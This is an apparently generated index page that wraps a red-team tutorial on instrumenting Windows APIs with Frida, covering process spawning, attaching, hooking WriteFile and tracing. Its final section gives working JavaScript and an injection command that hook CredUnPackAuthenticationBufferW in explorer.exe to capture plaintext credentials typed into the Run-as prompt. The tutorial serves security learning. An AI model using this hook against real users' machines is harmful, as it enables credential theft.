---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Instrumenting Windows APIs with Frida

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-miscellaneous-reversing-forensics-windows-kernel-internals-instrumenting-windows-apis-with-frida` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Instrumenting Windows APIs with Frida](../../topics/miscellaneous-reversing-forensics/instrumenting-windows-apis-with-frida.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-miscellaneous-reversing-forensics-windows-kernel-internals-instrumenting-windows-apis-with-frida |
| name | Instrumenting Windows APIs with Frida |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida.md |

## Preserved Source Material

````yaml
_asset_filenames:
- credential-popup-capture-credentials.gif
- credential-popup-trace.gif
- credential-popup.gif
- frida-instrumenting-api.gif
- frida-trace.gif
- image (742).png
- image (743).png
- image (744).png
- image (745).png
_body: "# Instrumenting Windows APIs with Frida\n\n[Frida](https://frida.re) is dynamic instrumentation toolkit for developers,\
  \ reverse-engineers, and security researchers.\n\n## Spawning New Process with Frida\n\nWe can ask frida to spawn a new\
  \ process for us to instrument:\n\n```\nfrida c:\\windows\\system32\\notepad.exe\n```\n\n![](<../../.gitbook/assets/image\
  \ (742).png>)\n\n## Attaching Frida to Existing Process\n\nWe can ask frida to attach to an existing process:\n\n```\nfrida\
  \ -p 10964\n```\n\n![](<../../.gitbook/assets/image (743).png>)\n\n## Hooking a Function\n\nThe below code in `hooking.js`\
  \ will find address of the Windows API `WriteFile` (lives in kernel32.dll/kernelbase.dll) and hexdump the contents of the\
  \ 1st argument passed to it:\n\n{% code title=\"hooking.js\" %}\n```javascript\nvar writeFile = Module.getExportByName(null,\
  \ \"WriteFile\");\n\nInterceptor.attach(writeFile, {\n    onEnter: function(args)\n    {\n        console.log(\"Buffer dump:\\\
  n\" + hexdump(args[1]));\n        // console.log(\"\\nBuffer via Cstring:\\n\" + Memory.readCString(args[1]));\n       \
  \ // console.log(\"\\nBuffer via utf8String:\\n\" + Memory.readUtf8String(args[1]));\n    }\n});\n```\n{% endcode %}\n\n\
  Let's spawn a new `notepad.exe` through Frida and supply it with the above `hooking.js` code, so that we can start instrumenting\
  \ the `WriteFile` API and inspect the contents of the buffer that is being written to disk:\n\n```\nfrida C:\\windows\\\
  system32\\notepad.exe -l .\\hooking.js\n```\n\n![](../../.gitbook/assets/frida-instrumenting-api.gif)\n\nNotice that we\
  \ can update the `hooking.js` code and the instrumentation happens instantly - it does not require us to re-spawn the notepad\
  \ or re-attaching Frida to it. In the above GIF, this can be seen at the end when we request the console to spit out the\
  \ `process.id` (the frida is attached to) and the notepad process ID gets printed out to the screen instantly.\n\n## Frida-Trace\n\
  \nIf we want to see if certain API calls are invoked by some specific process, say `WriteFile`, we can use `frida-trace`\
  \ tool like so:\n\n```\nfrida-trace -i \"WriteFile\" C:\\windows\\system32\\notepad.exe\n```\n\n![](../../.gitbook/assets/frida-trace.gif)\n\
  \n## Real Life Example - Intercepting Credentials\n\nBelow shows how we can combine the above knowledge for something a\
  \ bit more interesting.\n\nCan we intercept the plaintext credentials from the credentials prompt the user gets when they\
  \ want to execute a program as another user?\n\n![Credentials prompt presented for \"Run as different user\"](../../.gitbook/assets/credential-popup.gif)\n\
  \nThe answer is of course yes, so let's see how this could be done using Frida tools.\n\nLet's use `frida-trace` to see\
  \ if explorer.exe ever calls any functions named `*Cred*` when we invoke the credentials popup:\n\n```\nfrida-trace -i \"\
  *Cred*\" -p (ps explorer).id\n```\n\nBelow, we can see that indeed, there is a call to `CredUIPromptForWindowsCredentialsW`\
  \ made when the prompt is first invoked:\n\n![](../../.gitbook/assets/credential-popup-trace.gif)\n\nEntering some fake\
  \ credentials shows the following interesting `Cred*` API calls are made (in red):\n\n![](<../../.gitbook/assets/image (744).png>)\n\
  \n...and the [`CredUnPackAuthenticationBufferW`](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credunpackauthenticationbufferw)\
  \ (in lime) is of special interest, because per MSDN:\n\n> &#x20;The **CredUnPackAuthenticationBuffer** function converts\
  \ an authentication buffer returned by a call to the [CredUIPromptForWindowsCredentials](https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa)\
  \ function into a string user name and password.\n\nWe can now instrument `CredUnPackAuthenticationBufferW` in a frida javascript\
  \ like so:\n\n{% code title=\"Credentials.js\" %}\n```javascript\nvar username;\nvar password;\nvar CredUnPackAuthenticationBufferW\
  \ = Module.findExportByName(\"Credui.dll\", \"CredUnPackAuthenticationBufferW\")\n\nInterceptor.attach(CredUnPackAuthenticationBufferW,\
  \ {\n    onEnter: function (args) \n    {\n        // Credentials here are still encrypted\n        /*\n            CREDUIAPI\
  \ BOOL CredUnPackAuthenticationBufferW(\n                0 DWORD  dwFlags,\n                1 PVOID  pAuthBuffer,\n    \
  \            2 DWORD  cbAuthBuffer,\n                3 LPWSTR pszUserName,\n                4 DWORD  *pcchMaxUserName,\n\
  \                5 LPWSTR pszDomainName,\n                6 DWORD  *pcchMaxDomainName,\n                7 LPWSTR pszPassword,\n\
  \                8 DWORD  *pcchMaxPassword\n            );        \n        */\n        username = args[3];\n        password\
  \ = args[7];\n    },\n    onLeave: function (result)\n    {\n        // Credentials are now decrypted\n        var user\
  \ = username.readUtf16String()\n        var pass = password.readUtf16String()\n\n        if (user && pass)\n        {\n\
  \            console.log(\"\\n+ Intercepted Credentials\\n\" + user + \":\" + pass)\n        }\n    }\n});\n```\n{% endcode\
  \ %}\n\nWe can now hook the explorer.exe by providing frida with our instrumentation script like so:\n\n```\nfrida -p (ps\
  \ explorer).id -l C:\\labs\\frida\\hello-world\\credentials.js\n```\n\n![](<../../.gitbook/assets/image (745).png>)\n\n\
  With `CredUnPackAuthenticationBufferW ` instrumented, entering credentials in the prompt launched by explorer.exe, gives\
  \ us the expected result - the credentials are seen in plaintext:\n\n![](../../.gitbook/assets/credential-popup-capture-credentials.gif)\n\
  \n## Resources\n\n{% embed url=\"https://frida.re/docs/javascript-api/#memory\" %}"
_relative_path: miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida.md
````
